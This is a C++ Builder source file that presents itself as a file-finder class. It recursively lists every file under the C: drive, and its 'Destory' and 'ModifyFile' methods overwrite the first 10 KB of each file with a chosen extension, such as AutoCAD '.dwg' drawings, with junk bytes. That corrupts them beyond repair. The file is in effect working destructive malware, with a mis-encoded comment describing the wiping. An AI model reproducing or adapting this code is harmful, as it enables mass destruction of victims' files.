//---------------------------------------------------------------------------
#include <vcl.h>
#pragma hdrstop

#include "FindFile.h"

//---------------------------------------------------------------------------
#pragma package(smart_init)


class tFindFile{

private:
        TStringList *strListType;
        TStringList *ListPath;
        AnsiString strFrom; //���ҵ���ʼĿ¼
        AnsiString strExt;//��չ��
 public:       TStringList *tmp;
        //AnsiString strType;
public :
        void Find(void);
        tFindFile(){strListType=new TStringList();
                        ListPath=new TStringList();strFrom="c:";strExt="*.*";
                        tmp=new TStringList();}

        TStringList *GetFiles(void){return ListPath;}
        void SetFindType(AnsiString str){strExt=str;}
        void SetInitPath(AnsiString str){strFrom=str;}
//------------------->�ƻ�ָ����չ�����ļ�������ļ�ͷ1024*10�ֽڵ�����
        void Destory(AnsiString strType);  // strType=".dwg"
        void ModifyFile(AnsiString &str);
        };

#include "dir.h"
void tFindFile::Find()
{       AnsiString tmpFrom=strFrom;
        chdir(strFrom.c_str());
        TSearchRec sr;
        if(!FindFirst(strFrom +"\\"+strExt,faAnyFile,sr))
        {
        if((sr.Attr&faDirectory)&&(sr.Name!=".")&&(sr.Name!=".."))
        {strFrom=strFrom+"\\"+sr.Name;
         Find();
         strFrom=tmpFrom;}
        else { if((sr.Name!=".")&&(sr.Name!="..")) ListPath->Add(tmpFrom+"\\"+sr.Name);}

        }
        while(!FindNext(sr))
        {

        if((sr.Attr&faDirectory)&&(sr.Name!=".")&&(sr.Name!=".."))
        {strFrom=strFrom+"\\"+sr.Name;
         Find();
         strFrom=tmpFrom;
         }
        else { if((sr.Name!=".")&&(sr.Name!="..")) ListPath->Add(tmpFrom+"\\"+sr.Name);}

        }
        FindClose(sr);
        //chdir("..");


}

void tFindFile::Destory(AnsiString strType)
{       tmp->Clear();
        for(int i=0;i<ListPath->Count;i++)
        {
         if(ExtractFileExt(ListPath->Strings[i])==strType)
         //tmp->Add( ListPath->Strings[i]);
         ModifyFile(ListPath->Strings[i]);
        }
}

void tFindFile::ModifyFile(AnsiString &str)
{
        char buf[1024*10];
        int handle=FileOpen(str,2);
        FileWrite(handle,buf,sizeof(buf));
        FileClose(handle);


}
